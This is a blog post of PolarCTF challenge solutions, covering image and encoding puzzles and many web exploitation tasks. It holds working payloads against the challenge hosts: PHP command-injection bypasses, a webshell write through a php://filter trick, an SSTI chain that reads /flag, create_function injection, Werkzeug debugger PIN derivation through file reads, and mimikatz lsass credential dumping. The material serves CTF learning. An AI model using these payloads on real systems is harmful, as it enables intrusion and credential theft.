<hr>
<p>title: polarctf刷题记录<br>date: 2023-12-08 09:09:21<br>tags:<br>updated:<br>categories:<br>keywords:<br>description:<br>top_img: /images/polarctf/image-20231225150230307.png<br>comments:<br>cover: /images/polarctf/image-20231225150230307.png<br>toc:<br>toc_number:<br>copyright:<br>copyright_author:<br>copyright_author_href:<br>copyright_url:<br>copyright_info:<br>mathjax:<br>katex:<br>aplayer:<br>highlight_shrink:<br>aside:</p>
<hr>
<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="0和255"><a href="#0和255" class="headerlink" title="0和255"></a>0和255</h5><p>给到一个py文件，是图片生成坐标点的，也给了坐标点，<br>找chatgpt问一下还原一下代码</p>
<pre><code class="python">from PIL import Image

# 输入坐标点列表
image_list = [[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 0, 255, 255, 0, 255, 0, 0, 255, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 0, 0, 255, 255, 0, 0, 0, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 0, 255, 255, 255, 0, 255, 255, 0, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 0, 255, 255, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 0, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 255, 255, 255, 0, 255, 255, 0, 255, 0, 255, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 0, 255, 255, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 0, 255, 255, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 0, 0, 255, 255, 0, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 255, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 255, 0, 255, 255, 0, 0, 255, 255, 255, 0, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 255, 0, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 255, 0, 0, 255, 255, 0, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 255, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 255, 0, 0, 255, 0, 255, 255, 255, 0, 0, 255, 0, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 255, 255, 0, 255, 0, 255, 0, 255, 255, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 255, 255, 255, 0, 255, 0, 0, 0, 0, 255, 255, 255, 0, 255, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255, 255, 0, 255, 0, 255, 255, 255, 0, 255, 0, 0, 0, 255, 0, 255, 255, 255, 255], [255, 255, 255, 255, 0, 255, 255, 255, 255, 255, 0, 255, 255, 0, 255, 0, 0, 255, 255, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 0, 255, 255, 255, 0, 255, 255, 0, 0, 0, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255], [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]]

# 创建空白图像
img = Image.new(&#39;RGB&#39;, (33, 33), color = &#39;white&#39;)

# 填充像素点颜色
for y in range(img.height):
    for x in range(img.width):
        img.putpixel((x, y), image_list[y][x])

# 显示图像
img.show()

# 保存图像
img.save(&#39;restored_flag.png&#39;)
</code></pre>
<p><img src="/images/polarctf/image-20231208092154595.png" alt="image-20231208092154595"></p>
<p>扫码得到Polar_Night,0f46d4b056acb49f06b1090bab56189d</p>
<h5 id="01"><a href="#01" class="headerlink" title="01"></a>01</h5><pre><code class="python">from PIL import Image

# 输入01数据
data = [
    &#39;1111111011111001001111111&#39;,
    &#39;1000001000000001101000001&#39;,
    &#39;1011101000100010101011101&#39;,
    &#39;1011101010011110001011101&#39;,
    &#39;1011101001110010101011101&#39;,
    &#39;1000001000111001001000001&#39;,
    &#39;1111111010101010101111111&#39;,
    &#39;0000000000110001000000000&#39;,
    &#39;0010111011011101010001001&#39;,
    &#39;1110100111100111010101001&#39;,
    &#39;0110001100010000110111011&#39;,
    &#39;0000100100001010111100010&#39;,
    &#39;0001001111110100110001001&#39;,
    &#39;0001000110000101110101010&#39;,
    &#39;1001111000010111101011011&#39;,
    &#39;0101010001010010100000010&#39;,
    &#39;1001001011100111111111001&#39;,
    &#39;0000000011011100100010001&#39;,
    &#39;1111111001100010101011011&#39;,
    &#39;1000001011111001100011000&#39;,
    &#39;1011101011001010111111000&#39;,
    &#39;1011101000001110010111010&#39;,
    &#39;1011101011001000111110101&#39;,
    &#39;1000001001101001001110010&#39;,
    &#39;1111111000010001000011011&#39;
]

# 创建空白图像
img = Image.new(&#39;RGB&#39;, (len(data[0]), len(data)), color=&#39;white&#39;)

# 填充像素点颜色
for y in range(len(data)):
    for x in range(len(data[0])):
        pixel = (255, 255, 255) if data[y][x] == &#39;0&#39; else (0, 0, 0)
        img.putpixel((x, y), pixel)

# 显示图像
img.show()

# 保存图像
img.save(&#39;restored_image.png&#39;)
</code></pre>
<p><img src="/images/polarctf/image-20231208093657267.png" alt="image-20231208093657267"></p>
<p>解出来第一次见这种编码</p>
<pre><code>~呜喵喵喵喵呜啊喵啊呜呜喵呜呜~喵喵~啊喵啊呜喵喵~喵~喵~呜呜喵呜啊喵喵喵呜啊呜~啊呜喵呜呜啊呜~~啊喵啊呜喵喵~喵~喵~呜喵呜呜~喵喵喵呜啊喵呜啊呜喵呜呜啊呜呜~啊喵啊呜喵喵~喵~喵~呜喵呜~~喵喵喵呜呜呜呜啊呜喵呜呜啊呜喵喵啊喵啊呜喵喵~啊~喵~呜喵呜喵啊喵喵喵呜啊喵呜呜呜喵呜呜~喵啊~啊喵啊呜~呜喵呜~喵~呜呜喵呜呜喵喵喵呜啊喵呜呜呜喵呜呜啊呜~喵啊喵啊呜~呜啊~~喵~呜呜喵呜喵喵喵喵呜呜呜啊~呜喵呜呜啊呜啊~啊喵啊呜喵喵~呜~喵~呜喵呜~~喵喵喵呜呜呜呜~呜喵呜呜啊呜~啊啊喵啊呜喵喵喵喵~喵~呜喵呜喵~喵喵喵呜呜呜呜呜呜喵呜呜~喵~喵啊喵啊呜~呜喵~~喵~呜呜喵呜喵喵喵喵呜呜呜啊呜呜喵呜呜~呜呜喵啊
</code></pre>
<p>兽音译者<code>https://roar.iiilab.com/</code><br><img src="/images/polarctf/image-20231208094202833.png" alt="image-20231208094202833"></p>
<h5 id="docx隐写"><a href="#docx隐写" class="headerlink" title="docx隐写"></a>docx隐写</h5><p>打开word，全选改一下颜色即可，<img src="/images/polarctf/image-20231215155553572.png" alt="image-20231215155553572"></p>
<p>将docx改为zip，解压就能看到最后一段flag了</p>
<p><img src="/images/polarctf/image-20231215155409671.png" alt="image-20231215155409671"></p>
<h5 id="Xshell密码破解"><a href="#Xshell密码破解" class="headerlink" title="Xshell密码破解"></a>Xshell密码破解</h5><p>xshell文件解密，题目描述：这是一道贴合实际攻击场景的一道题，在一次溯源反制的过程中，purplet被蓝队大佬反制，自己的电脑竟被控制住了，蓝队大佬在从purplet的目标机中查到一段令人不解的数字：S-1-5-21-323397330-1794634962-2946154912-1001，同时还得到了一个Xshell的配置文件，他们想知道purplet这个人的Xshell连接过的服务器密码是多少，你能帮助他们破解开么？<br>flag{MD5（密码）}</p>
<p>这里给了一个xsh的文件，用这个项目的脚本解密</p>
<p><code>https://github.com/HyperSine/how-does-Xmanager-encrypt-password</code></p>
<p><code>python3 .\XShellCryptoHelper.py -d -ver 6.0 -user purplet -sid S-1-5-21-323397330-1794634962-2946154912-1001 vYZ6tni/wCY0aWv83Tu+0UvW5hCYP1gMOl8o/zF5LIJkmHsIpz1l1Avnog==</code></p>
<p>在这里面user可以猜到时purplet，sid给了，pass和ver都给了，直接解即可<code>nicaicai!23</code></p>
<p><img src="/images/polarctf/image-20231220210341006.png" alt="image-20231220210341006"></p>
<p>在md5即可</p>
<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>描述：峰哥某一天通过3389端口的CVE-2019-0708漏洞拿到了一台目标机器，并新建了一个管理员用户，远程登陆了目标主机，他知道内网中很多机器的密码会因为人为设置会出现相同的情况，所以它为了继续横向渗透，利用procdump工具提取了用户登录凭据，你能帮他继续破解出登录密码么？flag格式：flag{md5(登录密码)}<br>解开压缩包是一个dmp文件，提示了mimikatz,那应该就是本地文件读密码了</p>
<pre><code>#放在相同木录下，即可
minidump lsass.dmp
sekurlsa::logonpasswords
</code></pre>
<p><img src="/images/polarctf/image-20240112164350866.png" alt="image-20240112164350866"></p>
<p>toor的md5</p>
<h5 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h5><pre><code class="php">&lt;?php
/*

PolarD&amp;N CTF

*/
highlight_file(__FILE__);
function no($txt){
    if(!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;, $txt)){
    return $txt;}
   else{
die(&quot;what&#39;s up&quot;);}}
$yyds=($_POST[&#39;yyds&#39;]);
if(isset($_GET[&#39;sys&#39;])&amp;&amp;$yyds==&#39;666&#39;){
  eval(no($_GET[&#39;sys&#39;]));
  }
  else
    {echo &quot;nonono&quot;;
}
?&gt; nonono
</code></pre>
<p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ca&quot;&quot;t${IFS}/flag&#39;);</code></p>
<p><code>http://d66cc31d-7e85-4966-b532-b847f685bad3.www.polarctf.com:8090/?sys=passthru(&#39;ls${IFS}/&#39;);</code></p>
<h5 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h5><pre><code class="php">&lt;?php
/*

PolarD&amp;N CTF

*/

highlight_file(__FILE__);

file_put_contents($_GET[&#39;filename&#39;],&quot;&lt;?php exit();&quot;.$_POST[&#39;content&#39;]);

?&gt;
</code></pre>
<p>file_put_contents 绕过死亡die写shell，用base64 或者rot等绕过<code>https://www.freebuf.com/articles/web/266565.html</code></p>
<p>?filename=php://filter/convert.base64-decode/resource=1.php</p>
<p>content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</p>
<h5 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h5><p>view-source:<a href="http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp">http://d471787d-afe0-4441-beee-5dacb2a31213.www.polarctf.com:8090/.index.php.swp</a></p>
<pre><code>
function jiuzhe($xdmtql){
    return preg_match(&#39;/sys.*nb/is&#39;,$xdmtql);
}

$xdmtql=@$_POST[&#39;xdmtql&#39;];
if(!is_array($xdmtql)){
    if(!jiuzhe($xdmtql)){
        if(strpos($xdmtql,&#39;sys nb&#39;)!==false){
            echo &#39;flag{*******}&#39;;
        }else{
            echo &#39;true .swp file?&#39;;
        }
    }else{
        echo &#39;nijilenijile&#39;;
    }
}
</code></pre>
<p>抄的，<a href="https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)">https://blog.csdn.net/weixin_46029520/article/details/130173887![image-20231215161023782](/images/polarctf/image-20231215161023782.png)</a></p>
<h5 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h5><pre><code>&lt;?php
//flag in $flag
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$c=$_POST[&#39;sys&#39;];
$key1 = 0;
$key2 = 0;
if(isset($_GET[&#39;flag1&#39;]) || isset($_GET[&#39;flag2&#39;]) || isset($_POST[&#39;flag1&#39;]) || isset($_POST[&#39;flag2&#39;])) {//不能有flag12等
    die(&quot;nonononono&quot;);
}
@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
extract($_POST);接受post传参
if($flag1 == &#39;8gen1&#39; &amp;&amp; $flag2 == &#39;8gen1&#39;) {
    if(isset($_POST[&#39;504_SYS.COM&#39;])){
    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\&quot;|\&#39;|\,|\.|\?/&quot;, $c)){
         eval(&quot;$c&quot;);  

    }
}
}
?&gt;

//http://b19e6d80-35bf-4b97-96a4-3ab7636527a6.www.polarctf.com:8090/?_POST[flag1]=8gen1&amp;_POST[flag2]=8gen1
post:
504[SYS.COM=1&amp;sys=echo $flag;&amp;
</code></pre>
<h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><pre><code class="php">&lt;?php
error_reporting(0);

if(isset($_GET[&#39;pass&#39;])){
    $pass = md5($_GET[&#39;pass&#39;]);
    if(substr($pass, 1,1)===substr($pass, 14,1) &amp;&amp; substr($pass, 14,1) ===substr($pass, 17,1)){
        if((intval(substr($pass, 1,1))+intval(substr($pass, 14,1))+substr($pass, 17,1))/substr($pass, 1,1)===intval(substr($pass, 31,1))){
            include(&#39;flag.php&#39;);
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?&gt;
</code></pre>
<p>直接bp加载数字，一般都很小，</p>
<p><img src="/images/polarctf/image-20231215165948200.png" alt="image-20231215165948200"></p>
<h5 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h5><p>ban了很多，连/ 都办了，那估计在环境变量里了。</p>
<p><img src="/images/polarctf/image-20231215171714420.png" alt="image-20231215171714420"></p>
<p>可是环境变量的flag也不对，那估计还在index.php中，<code>/?ip=|echo%09Y2F0IGluZGV4LnBocA==|base64%09-d|sh</code></p>
<p><img src="/images/polarctf/image-20231215172622851.png" alt="image-20231215172622851"></p>
<h5 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h5><p>无字母数字rce</p>
<pre><code>assert(eval($_POST[1])); (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
</code></pre>
<h5 id="蜜雪冰城吉警店"><a href="#蜜雪冰城吉警店" class="headerlink" title="蜜雪冰城吉警店"></a>蜜雪冰城吉警店</h5><p>打开页面，看源码有js混淆，解不开，然后随便把一个id改为9即可，这里注意。他会自动跳到js的debugger，tcl，怎么跳都跳不出来，其实直接吧f12关掉即可，再去点</p>
<p><img src="/images/polarctf/image-20231219094406677.png" alt="image-20231219094406677"></p>
<h5 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h5><p>扫目录啥也没有扫到，bp抓包，有hint，解一下</p>
<p><img src="/images/polarctf/image-20231219103753764.png" alt="image-20231219103753764"></p>
<p><a href="http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/">http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/</a></p>
<p>base被ban了，rot即可</p>
<pre><code class="php">&lt;?php
error_reporting(0);

$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the 504sys&quot;)){
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag|data|base|write|input/i&quot;,$file)){
        echo &quot;I am sorry but no way!&quot;;
        exit(); 
    }else{
        include($file);  //imposible.php
    }
}
else{
    highlight_file(__FILE__);
}
?&gt;
//http://7e389493-2661-409f-a5d7-6b2bad00852e.www.polarctf.com:8090/n0_0ne_f1nd_m3/?text=data://text/plain,welcome to the 504sys&amp;file=php://filter/read=string.rot13/resource=imposible.php
</code></pre>
<h5 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h5><p>开局给到一个php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;config.php&quot;);
class qwq
{
    function __wakeup(){
        die(&quot;Access Denied!&quot;);
    }
    static function oao(){
        show_source(&quot;config.php&quot;);
    }
}
$str = file_get_contents(&quot;php://input&quot;);
if(preg_match(&#39;/\`|\_|\.|%|\*|\~|\^|\&#39;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#39;,$str)){
    die(&quot;I am sorry but you have to leave.&quot;);
}else{
    extract($_POST);
}
if(isset($shaw_root)){
    if(preg_match(&#39;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/&#39;, $shaw_root)&amp;&amp; strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;;
    }
}else{
    echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;;
    die();
}
if($ans===$SecretNumber){
    echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;;
    call_user_func($my_ans);
} I am sorry but you have to leave.
</code></pre>
<p>post的数据给到str，str的字符不能有这些，这里需注意下面有个_可以用[代替，</p>
<p>然后是一个正则，^-[a-e]：以-开头a-e</p>
<p>[^a-zA-Z0-8] 不能是这些，那就9</p>
<p><b>(.*)&gt;{4}：带<b></p>
<p>(.*)&gt;{4}: 匹配到4个&gt;</p>
<p>\D*?:应该是任意字符</p>
<p>(abc.*?)：abc开头</p>
<p>p(hp)*：php</p>
<p>@R(s|r).$： @R s或者r 任意结尾</p>
<p>所有字符为29位，如果不知道这些，可以一点一点匹配</p>
<p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr</code></p>
<p><img src="/images/polarctf/image-20231220220211554.png" alt="image-20231220220211554"></p>
<p><code>&lt;/code&gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5</code></p>
<pre><code class="php">import hashlib
import binascii

def mohu_md5():
    for i in range(10000,99999):
        t1 =  str(i)+&#39;XIPU&#39;
        t1 =  &#39;shaw&#39;+str(i)+&#39;root&#39;
        md5_result = hashlib.md5(t1.encode(&quot;utf-8&quot;)).hexdigest()
        #print(md5_result)
        if md5_result == &#39;166b47a5cb1ca2431a0edfcef200684f&#39;:
    
                print(t1 + &quot;-----&gt;&quot;+md5_result)
                break

mohu_md5()
</code></pre>
<pre><code>shaw21475root-----&gt;166b47a5cb1ca2431a0edfcef200684f
</code></pre>
<p>最后静态调用classqwq里的oao</p>
<p><code>shaw[root=-a9&lt;b&gt;&gt;&gt;&gt;&gt;aaaaaaaaaabcphp@Rsr&amp;ans=21475&amp;my[ans=qwq::oao</code></p>
<h5 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h5><p>拿到地址，注册和登录，随便注册一个，登录的时候抓包，会给我们一个cookie</p>
<p><img src="/images/polarctf/image-20231225095047221.png" alt="image-20231225095047221"></p>
<p>爆破该jwt密钥，<code>https://github.com/brendan-rius/c-jwt-cracker</code></p>
<p><code>└─# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEifQ.nioJtqW7tqRWVFsBsXjkJdjYx1NQM3NZZke8vUII6-8 Secret is &quot;SYSA&quot;</code></p>
<p>可以跑出来密钥位SYSA,<img src="/images/polarctf/image-20231225095558666.png" alt="image-20231225095558666"></p>
<p>到网站填写密钥，将用户名改为admin，拿到的jwt传回去即可</p>
<p><img src="/images/polarctf/image-20231225095659919.png" alt="image-20231225095659919"></p>
<h5 id="某函数的复仇"><a href="#某函数的复仇" class="headerlink" title="某函数的复仇"></a>某函数的复仇</h5><pre><code class="php">&lt;?php
highlight_file(__FILE__);
//flag:/flag
if(isset($_POST[&#39;shaw&#39;])){
    $shaw = $_POST[&#39;shaw&#39;];
    $root = $_GET[&#39;root&#39;];
    if(preg_match(&#39;/^[a-z_]*$/isD&#39;,$shaw)){
        if(!preg_match(&#39;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#39;,$root)){
            $shaw(&#39;&#39;,$root);
        }else{
            echo &quot;Almost there^^&quot;;
        }
    }
}
?&gt;
</code></pre>
<p>给了源码，传两个参数，动态命令执行，但是 $shaw(‘’,$root);这里前面是空，也就是要传两个参数，<br>creater_function 符合，</p>
<p>GET:POST /?root=2;}system(‘ca””t%09/flag’);// HTTP/1.1</p>
<p>POST:shaw=create_function</p>
<p>这样传参数就会是这样的</p>
<p>源代码：<br>function fT($a) {<br>  echo “test”.$a;<br>}</p>
<p>注入后代码：<br>function fT($a) {<br>  echo “test”2;}<br>  system(‘ca””t%09/flag’);此处为注入代码。<br>}</p>
<h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h5><p>没有任何过滤</p>
<p><code>http://59a4cdbc-3575-48d2-9721-3469502ed8eb.www.polarctf.com:8090/?name={%for(x)in().__class__.__base__.__subclasses__()%}{%if&#39;war&#39;in(x).__name__ %}{{x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}{%endif%}{%endfor%}</code></p>
<h5 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h5><p>什么是pin码？<br>pin码是flask应用在开启debug的模式下，进入控制台调试模式下所需的进入密码。相当于是pyshell</p>
<p>PIN<strong>是Werkzeug（它是Flask 的依赖项之一）提供的额外安全措施，以防止在不知道PIN 的情况下访问调试器</strong>。 您可以使用浏览器中的调试器引脚来启动交互式调试器。 请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。</p>
<p>在ctf中如果出现报错，点击右边的shell，就会弹出输入pin，输入后就会得到一个python的shell，那么就可以任意操作了。</p>
<p><img src="/images/polarctf/image-20240116141409456.png" alt="image-20240116141409456"></p>
<p><img src="/images/polarctf/image-20240116141458091.png" alt="image-20240116141458091"></p>
<p>pin码生成条件？<br>pin码有六个要素：<br>1，flask的用户名：username可以任意文件读的条件下读/etc/passwd或者进行猜测<br>2，modname-一般是f1ask.app<br>3，getattr(app,”_name_”,app.<em>class__·_name</em>)一般是Flask<br>4，moddir flask)库下app.py的绝对路径可以通过报错获取<br>5，int(uuid,16)即当前网络的mac地址的十进制数<br>6，get_machine._id()机器的id</p>
<p>回到题目</p>
<p>根据题目报错得知，有一个file路由，然后传参filename<br>这里猜测出现了任意文件读取，<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=app.py</a></p>
<pre><code class="python">
# -*- coding: utf-8 -*-
import pdb
from flask import Flask, request
app = Flask(__name__)

@app.route(&quot;/&quot;)
def hello():
    return Hello[&#39;a&#39;]

@app.route(&quot;/file&quot;)
def file():
    filename = request.args.get(&#39;filename&#39;)
    try:
        with open(filename, &#39;r&#39;) as f:
            return f.read()
    except:
        return &#39;不试试filename参数么?&#39;

if __name__ == &quot;__main__&quot;:
    app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True)
</code></pre>
<p>1，直接读取源码，可以看到就一个任意文件读取，因为题目给了pin，那么我们这里直接读取我们想要的，<br><a href="http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd">http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/etc/passwd</a></p>
<p><img src="/images/polarctf/image-20240116142708405.png" alt="image-20240116142708405"></p>
<p>没有啊，没有就用root<br>2，app.py的绝对路径，在报错页面可以看到，/usr/local/lib/python3.5/site-packages/flask/app.py<br><img src="/images/polarctf/image-20240116142915826.png" alt="image-20240116142915826"></p>
<p>3，mac地址的十进制数</p>
<p><code>http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/sys/class/net/eth0/address</code><br>02:42:ac:02:c4:8a</p>
<pre><code># 02:42:ac:02:c4:8a
# 将：去掉
# 0242ac02c48a
# 在python中进行转化
print(int(&#39;0242ac02c48a&#39;,16))
# 得到
# 2485376959626
</code></pre>
<p>4，引用大佬的解释：<br>对于非docker机每一个机器都会有自已唯-一的id<br>linux的id一般存放在/etc/machine-id或proc/sys/kernel/random/boot_i,有的<br>系统没有这两个文件。<br>对于docker机则读取/proc/self/cgroup,其中/docker/字符串后面的内容作为机器的id,</p>
<p><code>view-source:http://72b2fab5-b736-4aaa-8766-c182f6aaa036.www.polarctf.com:8090/file?filename=/proc/self/cgroup</code></p>
<p><img src="/images/polarctf/image-20240116143523439.png" alt="image-20240116143523439"></p>
<p>0::/docker/ce60aaa5cf72377fd3ba0eaba35544d4e680767b372b76b4a002241e8ff0302c<br>这里题目为3.5版本的python，还需要获取*/etc/machine-id<em>，且</em>/etc/machine-id*在前<br><img src="/images/polarctf/image-20240116150947159.png" alt="image-20240116150947159"></p>
<p>点击网站右边的小黑shell，输入213-649-252即可进入</p>
<p>进入之后再点小黑shell，即可命令执行了，</p>
<pre><code class="python">os.popen(&quot;ls -1 /&quot;).read() 
&#39;app\nbin\nboot\ndev\netc\nflag.sh\nflaggggg\nhome\nlib\nlib64\nmedia\[ ](http://6678d206-8d6f-4e53-a10e-99bbf94cc920.www.polarctf.com:8090/#)


